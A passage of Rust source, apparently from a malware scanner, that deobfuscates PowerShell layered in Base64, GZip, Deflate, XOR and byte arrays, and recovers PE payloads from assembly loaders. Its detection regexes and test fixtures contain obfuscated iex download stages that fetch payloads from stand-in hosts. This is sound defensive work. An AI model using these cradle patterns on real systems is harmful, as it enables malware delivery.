mod format_literal_prefilter_tests {
    use super::expand_format_literals;

    #[test]
    fn ignores_text_without_format_operator() {
        let text = "Write-Host 'hello world'";
        assert_eq!(expand_format_literals(text), text);
    }
}

#[cfg(test)]
mod marker_noise_prefilter_tests {
    use super::should_skip_marker_noise_line;

    #[test]
    fn ignores_plain_text_without_marker_noise_shape() {
        assert!(!should_skip_marker_noise_line("Write-Host hello world"));
    }
}

fn format_format_literal(template: String, args: &str) -> Option<String> {
    let template = format_format_literal_value(template, args)?;
    Some(format!("'{}'", template))
}

fn format_format_literal_value(mut template: String, args: &str) -> Option<String> {
    let mut arg_count = 0usize;
    for (idx, part) in FORMAT_ARG_RE.captures_iter(args).enumerate() {
        arg_count += 1;
        if arg_count > 128 {
            return None;
        }
        let value = part.get(1).or_else(|| part.get(2))?.as_str();
        template = template.replace(&format!("{{{idx}}}"), value);
        if template.len() > 8192 {
            return None;
        }
    }
    Some(template)
}

fn expand_ps_string_format_static(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "String]::Format") {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = STRING_FORMAT_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let template = caps.get(1).or_else(|| caps.get(2))?.as_str();
            if template.len() > 8192 {
                return None;
            }
            let args = caps.get(3)?.as_str();
            let formatted = format_format_literal_value(template.to_string(), args)?;
            Some((
                full.start(),
                full.end(),
                format!("'{}'", formatted.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[allow(clippy::expect_used)]
static B64_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*['"]([A-Za-z0-9+/=]+)['"]\s*\)"#,
    )
    .expect("b64 literal regex")
});

#[allow(clippy::expect_used)]
static GETSTRING_B64_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[(?:System\.)?(?:Text\.)?Encoding\]::(UTF8|ASCII|Unicode|UTF7|BigEndianUnicode|UTF32)\.GetString\s*\(\s*\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*\(*\s*['"]([A-Za-z0-9+/=\s]+)['"]\s*(?:\.\s*Trim(?:Start|End)?\s*\(\s*\))?\s*\)*\s*\)\s*\)"#,
    )
    .expect("getstring b64 literal regex")
});

#[allow(clippy::expect_used)]
static GETSTRING_B64_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[(?:System\.)?(?:Text\.)?Encoding\]::(UTF8|ASCII|Unicode|UTF7|BigEndianUnicode|UTF32)\.GetString\s*\(\s*\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*\(*\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\.\s*Trim(?:Start|End)?\s*\(\s*\))?\s*\)*\s*\)\s*\)"#,
    )
    .expect("getstring b64 var regex")
});

#[allow(clippy::expect_used)]
static GETSTRING_BYTE_ARRAY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[(?:System\.)?(?:Text\.)?Encoding\]::(UTF8|ASCII|Unicode|UTF7|BigEndianUnicode|UTF32)\.GetString\s*\(\s*\[\s*byte\s*\[\]\s*\]\s*@?\(\s*((?:0x[0-9a-f]+|\d+)\s*(?:,\s*(?:0x[0-9a-f]+|\d+)\s*){3,})\)\s*\)"#,
    )
    .expect("getstring byte array regex")
});

#[allow(clippy::expect_used)]
static FROMB64_LONG_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)FromBase64String\s*\(\s*['"]([A-Za-z0-9+/=]{40,})['"]"#)
        .expect("long frombase64 literal regex")
});

#[allow(clippy::expect_used)]
static GZIP_B64_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*\(*\s*['"]([A-Za-z0-9+/=]+)['"]\s*\)*\s*\)"#,
    )
    .expect("gzip b64 literal regex")
});

#[allow(clippy::expect_used)]
static PS_LONG_B64_VAR_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*["']([A-Za-z0-9+/=]{256,})["']"#)
        .expect("ps long b64 var assign regex")
});

#[allow(clippy::expect_used)]
static PS_FUNCTION_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\bfunction\s+([A-Za-z_][A-Za-z0-9_]*)\b"#).expect("ps function def regex")
});

#[allow(clippy::expect_used)]
static PS_GZIP_FUNCTION_GETSTRING_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*\[(?:System\.)?(?:Text\.)?Encoding\]::(?:UTF8|ASCII|Unicode|UTF7|BigEndianUnicode|UTF32)\.GetString\s*\(\s*\(*\s*([A-Za-z_][A-Za-z0-9_]*)\s*\(\s*\(*\s*\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)\s*\)*\s*\)\s*\)*\s*\)\s*(?:\.TrimEnd\s*\([^)]*\))?"#,
    )
    .expect("ps gzip function getstring var regex")
});

#[allow(clippy::expect_used)]
static PS_INVOKE_EXPRESSION_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\b(?:iex|invoke-expression)\s+\$([A-Za-z_][A-Za-z0-9_]*)\b"#)
        .expect("ps invoke-expression var regex")
});

#[allow(clippy::expect_used)]
static READ_TO_END_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"(?i)\.ReadToEnd\s*\(\s*\)"#).expect("readtoend regex"));

#[allow(clippy::expect_used)]
static JSON_SCRIPT_B64_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*\(\s*'\{[^']*"Script"\s*:\s*"([A-Za-z0-9+/=]+)"[^']*\}'\s*\|\s*ConvertFrom-Json\s*\)\.Script\s*\)"#,
    )
    .expect("json script b64 regex")
});

#[derive(Clone, Copy)]
enum PsCompressionStream {
    Gzip,
    Deflate,
}

fn expand_gzip_base64_literals(text: &str) -> String {
    let has_gzip = contains_ascii_case_insensitive(text, "gzipstream");
    let has_deflate = contains_ascii_case_insensitive(text, "deflatestream");
    if (!has_gzip && !has_deflate) || !contains_ascii_case_insensitive(text, "frombase64string") {
        return text.to_string();
    }

    let matches: Vec<(usize, usize, String)> = GZIP_B64_LITERAL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let b64 = caps.get(1)?.as_str();
            let decoded = decode_ps_base64_string(b64)?;
            let (start, end, stream) = compression_wrapper_bounds(text, full.start(), full.end())
                .unwrap_or_else(|| {
                    let stream = if has_deflate {
                        PsCompressionStream::Deflate
                    } else {
                        PsCompressionStream::Gzip
                    };
                    (full.start(), full.end(), stream)
                });
            let inflated = decompress_ps_stream(&decoded, stream, 2 * 1024 * 1024)?;
            let s = decode_payload(&inflated).into_owned().replace('\'', "''");
            Some((start, end, format!("'{s}'")))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn decompress_ps_stream(
    bytes: &[u8],
    stream: PsCompressionStream,
    max_bytes: usize,
) -> Option<Vec<u8>> {
    use std::io::Read as _;

    match stream {
        PsCompressionStream::Gzip => crate::aes_chain::crypto::gunzip(bytes, max_bytes).ok(),
        PsCompressionStream::Deflate => {
            let mut decoder = flate2::read::DeflateDecoder::new(bytes);
            let mut out = Vec::new();
            std::io::Read::take(&mut decoder, max_bytes.saturating_add(1) as u64)
                .read_to_end(&mut out)
                .ok()?;
            if out.len() > max_bytes {
                return None;
            }
            Some(out)
        }
    }
}

pub(crate) fn recover_deflate_xor_base64_assembly_payloads(
    text: &str,
    deadline: Option<std::time::Instant>,
) -> Vec<Vec<u8>> {
    const MAX_SCRIPT_BYTES: usize = 4 * 1024 * 1024;
    const MAX_PAYLOAD_BYTES: usize = 16 * 1024 * 1024;

    if text.len() > MAX_SCRIPT_BYTES
        || ps_deadline_expired(deadline)
        || !looks_like_deflate_xor_base64_assembly_loader(text)
    {
        return Vec::new();
    }

    let definitions: Vec<_> = PS_FUNCTION_DEF_RE.captures_iter(text).collect();
    let mut loader_names = Vec::new();
    for (idx, caps) in definitions.iter().enumerate() {
        let Some(name) = caps.get(1).map(|matched| matched.as_str()) else {
            continue;
        };
        let Some(full) = caps.get(0) else {
            continue;
        };
        let end = definitions
            .get(idx + 1)
            .and_then(|next| next.get(0).map(|matched| matched.start()))
            .unwrap_or(text.len())
            .min(full.start().saturating_add(16 * 1024));
        let body = &text[full.end()..end];
        if contains_ascii_case_insensitive(body, "decompress")
            && contains_ascii_case_insensitive(body, "xor")
            && contains_ascii_case_insensitive(body, "assembly")
        {
            loader_names.push(name);
        }
    }

    let mut recovered = Vec::new();
    for name in loader_names {
        if ps_deadline_expired(deadline) {
            break;
        }
        let pattern = format!(
            r#"(?im)(?:^|[;\r\n])\s*{}\s+-a\s*["']([A-Za-z0-9+/=]+)["']\s+-b\s*(0x[0-9a-f]+|\d+)\b"#,
            regex::escape(name)
        );
        let Ok(call_re) = Regex::new(&pattern) else {
            continue;
        };
        for caps in call_re.captures_iter(text) {
            if ps_deadline_expired(deadline) {
                return recovered;
            }
            let Some(blob) = caps.get(1).map(|matched| matched.as_str()) else {
                continue;
            };
            if !(16..=MAX_SCRIPT_BYTES).contains(&blob.len()) {
                continue;
            }
            let Some(key) = caps
                .get(2)
                .and_then(|matched| parse_powershell_byte_literal(matched.as_str()))
            else {
                continue;
            };
            let Ok(encrypted) = base64::engine::general_purpose::STANDARD.decode(blob) else {
                continue;
            };
            let xored: Vec<u8> = encrypted.into_iter().map(|byte| byte ^ key).collect();
            let Some(payload) =
                decompress_ps_stream(&xored, PsCompressionStream::Deflate, MAX_PAYLOAD_BYTES)
            else {
                continue;
            };
            if looks_like_portable_executable(&payload) {
                recovered.push(payload);
            }
        }
    }
    recovered
}

fn looks_like_deflate_xor_base64_assembly_loader(text: &str) -> bool {
    contains_ascii_case_insensitive(text, "function")
        && contains_ascii_case_insensitive(text, "deflatestream")
        && contains_ascii_case_insensitive(text, "frombase64string")
        && contains_ascii_case_insensitive(text, "assembly]::load")
}

fn parse_powershell_byte_literal(value: &str) -> Option<u8> {
    let value = value.trim();
    if let Some(hex) = value.strip_prefix("0x") {
        u8::from_str_radix(hex, 16).ok()
    } else {
        value.parse::<u8>().ok()
    }
}

fn looks_like_portable_executable(bytes: &[u8]) -> bool {
    if bytes.len() < 0x40 || !bytes.starts_with(b"MZ") {
        return false;
    }
    let offset = u32::from_le_bytes(bytes[0x3c..0x40].try_into().unwrap_or_default()) as usize;
    bytes
        .get(offset..offset.saturating_add(4))
        .is_some_and(|signature| signature == b"PE\0\0")
}

#[cfg(test)]
mod gzip_base64_prefilter_tests {
    use base64::Engine as _;
    use std::io::Write as _;

    use super::{
        expand_gzip_base64_literals, expand_gzip_function_base64_variables, gzip_wrapper_bounds,
        normalize_ps1_text,
    };

    #[test]
    fn ignores_text_without_gzip_base64_shape() {
        let text = "Write-Host hello world";
        assert_eq!(expand_gzip_base64_literals(text), text);
    }

    #[test]
    fn finds_mixed_case_wrapper_bounds() {
        let text = "New-Object System.IO.StreamReader; [Convert]::FromBase64String('QUJDRA=='); GZipStream; MemoryStream; .ReadToEnd()";
        let b64_start = text.find("QUJDRA==");
        assert!(b64_start.is_some(), "b64 start");
        let b64_start = b64_start.unwrap_or_default();
        let b64_end = b64_start + "QUJDRA==".len();
        let bounds = gzip_wrapper_bounds(text, b64_start, b64_end);
        assert!(bounds.is_some(), "wrapper bounds");
        let bounds = bounds.unwrap_or_default();
        assert_eq!(bounds.0, 0);
        assert!(bounds.1 > b64_end);
    }

    #[test]
    fn long_non_ascii_tail_does_not_panic_at_scan_cap() {
        let prefix = "New-Object System.IO.StreamReader; [Convert]::FromBase64String('QUJDRA==')";
        let text = format!("{prefix}A{}", "é".repeat(8192));
        assert!(gzip_wrapper_bounds(&text, prefix.len(), prefix.len()).is_none());
    }

    #[test]
    fn long_non_ascii_function_body_does_not_panic_at_scan_cap() {
        let b64 = "A".repeat(256);
        let text = format!(
            "$blob = '{b64}'; GZipStream; [Convert]::FromBase64String($blob); function Inflate {}",
            "é".repeat(4096)
        );
        assert_eq!(expand_gzip_function_base64_variables(&text), text);
    }

    #[test]
    #[allow(clippy::expect_used)]
    fn normalizes_variable_backed_gzip_stream_iex_stage() {
        let stage = "Invoke-WebRequest -Uri 'https://gzip-variable.example/payload.ps1'";
        let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        encoder
            .write_all(stage.as_bytes())
            .expect("writes gzip fixture");
        let b64 = base64::engine::general_purpose::STANDARD
            .encode(encoder.finish().expect("finishes gzip fixture"));
        let script = format!(
            "$blob='{b64}';\
             $ms=New-Object IO.MemoryStream(,[Convert]::FromBase64String($blob));\
             $gz=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress);\
             $sr=New-Object IO.StreamReader($gz);iex($sr.ReadToEnd())"
        );

        let normalized = normalize_ps1_text(&script);
        assert!(
            normalized.contains("https://gzip-variable.example/payload.ps1"),
            "variable-backed GZip IEX stage was not normalized: {normalized}"
        );
    }
}

fn expand_gzip_function_base64_variables(text: &str) -> String {
    let has_gzip = contains_ascii_case_insensitive(text, "gzipstream");
    let has_deflate = contains_ascii_case_insensitive(text, "deflatestream");
    if (!has_gzip && !has_deflate) || !contains_ascii_case_insensitive(text, "frombase64string") {
        return text.to_string();
    }

    let mut b64_vars = std::collections::HashMap::new();
    for caps in PS_LONG_B64_VAR_ASSIGN_RE.captures_iter(text).take(32) {
        let Some(name) = caps.get(1) else { continue };
        let Some(value) = caps.get(2) else { continue };
        if value.as_str().len() <= 2 * 1024 * 1024 {
            b64_vars.insert(name.as_str().to_ascii_lowercase(), value.as_str());
        }
    }
    if b64_vars.is_empty() {
        return text.to_string();
    }

    let mut compression_functions = std::collections::HashMap::new();
    for caps in PS_FUNCTION_DEF_RE.captures_iter(text) {
        let Some(full) = caps.get(0) else { continue };
        let Some(name) = caps.get(1) else { continue };
        let body_end = floor_char_boundary(text, full.end().saturating_add(4096));
        let body = &text[full.end()..body_end];
        if contains_ascii_case_insensitive(body, "gzipstream") {
            compression_functions.insert(
                name.as_str().to_ascii_lowercase(),
                PsCompressionStream::Gzip,
            );
        } else if contains_ascii_case_insensitive(body, "deflatestream") {
            compression_functions.insert(
                name.as_str().to_ascii_lowercase(),
                PsCompressionStream::Deflate,
            );
        }
    }
    if compression_functions.is_empty() {
        return text.to_string();
    }

    let matches: Vec<(usize, usize, String)> = PS_GZIP_FUNCTION_GETSTRING_VAR_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let out_var = caps.get(1)?.as_str();
            let function_name = caps.get(2)?.as_str().to_ascii_lowercase();
            let stream = *compression_functions.get(&function_name)?;
            let b64_var = caps.get(3)?.as_str().to_ascii_lowercase();
            let b64 = b64_vars.get(&b64_var)?;
            let decoded = decode_ps_base64_string(b64)?;
            let inflated = decompress_ps_stream(&decoded, stream, 4 * 1024 * 1024)?;
            let s = decode_payload(&inflated).into_owned().replace('\'', "''");
            Some((full.start(), full.end(), format!("${out_var} = '{s}'")))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[cfg(test)]
fn gzip_wrapper_bounds(text: &str, b64_start: usize, b64_end: usize) -> Option<(usize, usize)> {
    compression_wrapper_bounds(text, b64_start, b64_end).map(|(start, end, _)| (start, end))
}

fn compression_wrapper_bounds(
    text: &str,
    b64_start: usize,
    b64_end: usize,
) -> Option<(usize, usize, PsCompressionStream)> {
    let lower = text.to_ascii_lowercase();
    let after_end = floor_char_boundary(text, b64_end.saturating_add(8192));
    let after = &text[b64_end..after_end];
    let read_to_end = READ_TO_END_RE.find(after)?;
    let end = b64_end + read_to_end.end();
    for marker in [
        "new-object system.io.streamreader",
        "new-object io.streamreader",
        "[system.io.streamreader]::new",
        "[io.streamreader]::new",
        "new-object system.io.memorystream",
        "new-object io.memorystream",
        "[system.io.memorystream]::new",
        "[io.memorystream]::new",
    ] {
        let Some(start) = lower[..b64_start].rfind(marker) else {
            continue;
        };
        let wrapper = &lower[start..end];
        if !wrapper.contains("memorystream") {
            continue;
        }
        let stream = if wrapper.contains("gzipstream") {
            PsCompressionStream::Gzip
        } else if wrapper.contains("deflatestream") {
            PsCompressionStream::Deflate
        } else {
            continue;
        };
        return Some((start, end, stream));
    }
    None
}

fn expand_json_script_base64(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "convertfrom-json") {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = JSON_SCRIPT_B64_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let b64 = caps.get(1)?.as_str();
            let decoded = base64::engine::general_purpose::STANDARD.decode(b64).ok()?;
            let s = decode_payload(&decoded).into_owned();
            Some((full.start(), full.end(), format!("'{}'", s)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_marker_chunk_base64_carrier(text: &str) -> String {
    let Some(decoded) = decode_marker_chunk_base64_carrier(text) else {
        return text.to_string();
    };
    if text.contains(&decoded) {
        return text.to_string();
    }

    let mut out = text.to_string();
    out.push('\n');
    out.push_str(&decoded);
    out
}

fn decode_marker_chunk_base64_carrier(text: &str) -> Option<String> {
    let lower = text.to_ascii_lowercase();
    if !text.contains(":::")
        || !lower.contains("frombase64string")
        || !(lower.contains("rawlines") || lower.contains("substring(4)"))
    {
        return None;
    }

    let mut chunks = std::collections::BTreeMap::new();
    for line in text.lines() {
        let trimmed = line.trim();
        let Some(rest) = trimmed.strip_prefix(":::") else {
            continue;
        };
        let Some(index) = rest
            .as_bytes()
            .first()
            .copied()
            .filter(|b| b.is_ascii_digit())
            .map(|b| usize::from(b - b'0'))
        else {
            continue;
        };
        let chunk = rest[1..]
            .trim()
            .trim_matches(['"', '\'', '`', ' ', '\t', '\r', '\n'])
            .replace("\"\"", "\"")
            .replace("''", "'");
        if !chunk.is_empty() {
            chunks.insert(index, chunk);
        }
    }
    if chunks.len() < 2 {
        return None;
    }

    let mut joined = String::new();
    for chunk in chunks.values() {
        joined.push_str(chunk);
    }
    for caps in PS_EMPTY_REPLACE_OPERATOR_RE.captures_iter(text).take(16) {
        let Some(marker) = caps.get(1) else { continue };
        let marker = marker.as_str().replace("''", "'");
        if !marker.is_empty() {
            joined = joined.replace(marker.as_str(), "");
        }
    }
    let cleaned: String = joined.chars().filter(|c| !c.is_whitespace()).collect();
    if cleaned.len() < 40 {
        return None;
    }
    let decoded_bytes = decode_ps_base64_string(&cleaned)?;
    let decoded = if lower.contains("encoding]::unicode") || lower.contains("encoding.unicode") {
        decode_utf16_lossy(&decoded_bytes, false)
            .unwrap_or_else(|| decode_payload(&decoded_bytes).into_owned())
    } else {
        decode_payload(&decoded_bytes).into_owned()
    };
    let decoded = decoded.trim_matches('\u{feff}').trim();
    if decoded.is_empty() {
        return None;
    }
    Some(decoded.to_string())
}

#[cfg(test)]
mod json_script_base64_prefilter_tests {
    use super::expand_json_script_base64;

    #[test]
    fn ignores_text_without_convertfrom_json_shape() {
        let text = "Write-Host hello world";
        assert_eq!(expand_json_script_base64(text), text);
    }
}

fn expand_getstring_base64_literals(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "getstring")
        || !contains_ascii_case_insensitive(text, "frombase64string")
    {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = GETSTRING_B64_LITERAL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let encoding = caps.get(1)?.as_str().to_ascii_lowercase();
            let b64 = caps.get(2)?.as_str();
            let decoded = decode_ps_base64_string(b64)?;
            let value = match encoding.as_str() {
                "unicode" => decode_utf16_lossy(&decoded, false)?,
                "bigendianunicode" => decode_utf16_lossy(&decoded, true)?,
                _ => String::from_utf8_lossy(&decoded).into_owned(),
            };
            Some((
                full.start(),
                full.end(),
                format!("'{}'", value.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_getstring_base64_variables(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "getstring")
        || !contains_ascii_case_insensitive(text, "frombase64string")
    {
        return text.to_string();
    }
    let bindings = ps_string_bindings(text);
    if bindings.is_empty() {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = GETSTRING_B64_VAR_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let encoding = caps.get(1)?.as_str().to_ascii_lowercase();
            let var = caps.get(2)?.as_str().to_ascii_lowercase();
            let b64 = bindings.get(&var)?;
            let decoded = decode_ps_base64_string(b64)?;
            if !should_inline_base64_decoded_payload(&decoded) {
                return None;
            }
            let value = match encoding.as_str() {
                "unicode" => decode_utf16_lossy(&decoded, false)?,
                "bigendianunicode" => decode_utf16_lossy(&decoded, true)?,
                _ => String::from_utf8_lossy(&decoded).into_owned(),
            };
            Some((
                full.start(),
                full.end(),
                format!("'{}'", value.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn decode_ps_base64_string(encoded: &str) -> Option<Vec<u8>> {
    let cleaned = encoded
        .chars()
        .filter(|ch| !ch.is_whitespace())
        .collect::<String>();
    if cleaned.is_empty() {
        return None;
    }
    base64::engine::general_purpose::STANDARD
        .decode(cleaned)
        .ok()
}

fn expand_getstring_byte_arrays(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "getstring")
        || !contains_ascii_case_insensitive(text, "byte")
    {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = GETSTRING_BYTE_ARRAY_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let encoding = caps.get(1)?.as_str();
            let bytes = parse_ps_byte_array(caps.get(2)?.as_str())?;
            if bytes.len() > 128 * 1024 {
                return None;
            }
            let value = decode_ps_getstring_bytes(encoding, &bytes)?;
            Some((
                full.start(),
                full.end(),
                format!("'{}'", value.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn parse_ps_byte_array(nums: &str) -> Option<Vec<u8>> {
    let mut out = Vec::new();
    for part in nums.split(',') {
        let part = part.trim();
        let value = if let Some(hex) = part.strip_prefix("0x").or_else(|| part.strip_prefix("0X")) {
            u16::from_str_radix(hex, 16).ok()?
        } else {
            part.parse::<u16>().ok()?
        };
        let byte = u8::try_from(value).ok()?;
        out.push(byte);
        if out.len() > 128 * 1024 {
            return None;
        }
    }
    (!out.is_empty()).then_some(out)
}

fn decode_ps_getstring_bytes(encoding: &str, bytes: &[u8]) -> Option<String> {
    match encoding.to_ascii_lowercase().as_str() {
        "unicode" => decode_utf16_lossy(bytes, false),
        "bigendianunicode" => decode_utf16_lossy(bytes, true),
        "utf32" => decode_utf32_lossy(bytes, false),
        _ => Some(String::from_utf8_lossy(bytes).into_owned()),
    }
}

#[cfg(test)]
mod getstring_base64_prefilter_tests {
    use base64::Engine as _;
    use std::io::Write as _;

    use super::{
        expand_getstring_base64_literals, expand_getstring_base64_variables, normalize_ps1_text,
    };

    #[test]
    fn ignores_text_without_getstring_base64_shape() {
        let text = "Write-Host 'hello world'";
        assert_eq!(expand_getstring_base64_literals(text), text);
        assert_eq!(expand_getstring_base64_variables(text), text);
    }

    #[test]
    #[allow(clippy::expect_used)]
    fn normalizes_marker_replaced_nested_getstring_base64_literal() {
        let marker = "zvzrdidyvslx";
        let final_stage = "Invoke-WebRequest -Uri 'https://marker-replace.example/payload.ps1'";
        let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        encoder
            .write_all(final_stage.as_bytes())
            .expect("writes gzip fixture");
        let gzip_b64 = base64::engine::general_purpose::STANDARD
            .encode(encoder.finish().expect("finishes gzip fixture"));
        let stage = format!(
            "$blob='{gzip_b64}';\
             $ms=New-Object IO.MemoryStream(,[Convert]::FromBase64String($blob));\
             $gz=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress);\
             $sr=New-Object IO.StreamReader($gz);iex($sr.ReadToEnd())"
        );
        let b64 = base64::engine::general_purpose::STANDARD.encode(
            stage
                .encode_utf16()
                .flat_map(u16::to_le_bytes)
                .collect::<Vec<_>>(),
        );
        let mut noisy = String::with_capacity(b64.len() + b64.len() / 35 * marker.len());
        for chunk in b64.as_bytes().chunks(35) {
            noisy.push_str(&String::from_utf8_lossy(chunk));
            noisy.push_str(marker);
        }
        let text = format!(
            "\"iex([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(('{}').Replace('{}',''))))\"",
            noisy, marker
        );

        let normalized = normalize_ps1_text(&text);
        assert!(
            normalized.contains("https://marker-replace.example/payload.ps1"),
            "marker-replaced Base64 stage was not normalized: {normalized}"
        );
    }
}

#[cfg(test)]
mod ps_literal_urls_download_context_tests {
    use super::ps_literal_urls_in_download_context;

    #[test]
    fn ignores_plain_text_without_download_context() {
        let text = "Write-Host 'https://example.com'";
        assert!(ps_literal_urls_in_download_context(text).is_empty());
    }
}

fn expand_convert_frombase64_literals(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "frombase64string") {
        return text.to_string();
    }
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut cursor = 0usize;
    while let Some(name_start) = find_ascii_case_insensitive_from(text, "frombase64string", cursor)
    {
        // Walk back ~32 bytes to look for the `[...Convert]::` prefix, but
        // clamp to a UTF-8 char boundary — a fixed byte offset can land
        // inside a multi-byte char (e.g. CJK-named vars), which would panic
        // the `text[search_start..name_start]` slice below.
        let mut search_start = name_start.saturating_sub(32);
        while search_start > 0 && !text.is_char_boundary(search_start) {
            search_start -= 1;
        }
        let Some(bracket_rel) = text[search_start..name_start].rfind('[') else {
            cursor = name_start + "frombase64string".len();
            continue;
        };
        let call_start = search_start + bracket_rel;
        if !contains_ascii_case_insensitive(&text[call_start..name_start], "convert]::") {
            cursor = name_start + "frombase64string".len();
            continue;
        }
        let Some(open_rel) = text[name_start..].find('(') else {
            break;
        };
        let pos = skip_ascii_ws(bytes, name_start + open_rel + 1);
        let Some((b64, quote_end)) = parse_ps_quoted_argument(text, pos) else {
            cursor = name_start + "frombase64string".len();
            continue;
        };
        let mut end = quote_end;
        end = skip_ascii_ws(bytes, end);
        if bytes.get(end) == Some(&b')') {
            end += 1;
        }
        let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) else {
            cursor = name_start + "frombase64string".len();
            continue;
        };
        let decoded = decode_payload(&decoded).into_owned();
        if !contains_ascii_case_insensitive(&decoded, "http://")
            && !contains_ascii_case_insensitive(&decoded, "https://")
            && !contains_ascii_case_insensitive(&decoded, "download")
            && !contains_ascii_case_insensitive(&decoded, "frombase64string")
            && !contains_ascii_case_insensitive(&decoded, "invoke-")
        {
            cursor = end;
            continue;
        }
        let decoded = decoded.replace('\'', "''");
        matches.push((call_start, end, format!("'{decoded}'")));
        cursor = end;
    }
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[cfg(test)]
mod convert_frombase64_prefilter_tests {
    use super::expand_convert_frombase64_literals;

    #[test]
    fn ignores_text_without_frombase64string_shape() {
        let text = "Write-Host hello world";
        assert_eq!(expand_convert_frombase64_literals(text), text);
    }

    #[test]
    fn expands_whitespace_padded_frombase64string_calls() {
        let text = r#"[System.CoNvErT]::FromBase64String(
            'SW52b2tlLVdlYlJlcXVlc3QgaHR0cHM6Ly9leGFtcGxlLmNvbQ=='
        )"#;
        let out = expand_convert_frombase64_literals(text);
        assert!(out.contains("'Invoke-WebRequest https://example.com'"));
    }
}

fn append_decoded_frombase64_literals(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "frombase64string") && !text.contains('=') {
        return text.to_string();
    }
    let mut out = text.to_string();
    let mut seen = std::collections::HashSet::new();
    for caps in FROMB64_LONG_LITERAL_RE.captures_iter(text) {
        let Some(b64) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        if !seen.insert(b64) {
            continue;
        }
        let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) else {
            continue;
        };
        let decoded = decode_payload(&decoded);
        if contains_ascii_case_insensitive(&decoded, "http://")
            || contains_ascii_case_insensitive(&decoded, "https://")
            || contains_ascii_case_insensitive(&decoded, "download")
            || contains_ascii_case_insensitive(&decoded, "frombase64string")
        {
            out.push('\n');
            out.push_str(&decoded);
        }
    }
    out
}

fn append_decoded_rc4_wrappers(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "-bxor")
        || !contains_ascii_case_insensitive(text, "frombase64string")
    {
        return text.to_string();
    }
    let Some(decoded) = decode_rc4_wrapper_from_text(text) else {
        return text.to_string();
    };
    let decoded = decode_payload(&decoded);
    if decoded.trim().is_empty() {
        return text.to_string();
    }
    let mut out = text.to_string();
